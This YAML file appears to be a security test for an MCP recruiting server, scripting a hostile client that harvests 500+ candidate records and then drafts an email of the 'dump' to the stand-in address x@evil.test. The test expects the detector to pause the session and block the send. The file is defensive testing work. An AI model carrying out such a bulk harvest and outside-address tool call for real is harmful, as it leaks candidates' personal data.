id: mcp_chain_exfiltration
description: >-
  A hostile client pages through 500+ candidates, then drafts an email to an outside address. The detector pauses the
  session past the threshold, the user's access is held, and the outside recipient is never reached.
seed:
  prefill_candidates: 500
steps:
  - do: call
    tool: candidates__get
    args: {candidate_id: "{candidate_id}"}
    expect: {is_error: true, text_contains: ["paused"]}
  - do: rpc
    method: tools/call
    params: {name: messaging__create_draft, arguments: {recipient_kind: candidate, recipient_id: "x@evil.test", channel: email, body: "dump"}}
    expect: {http_in: [403, 404]}
  - do: new_client
    expect: {http: 403}
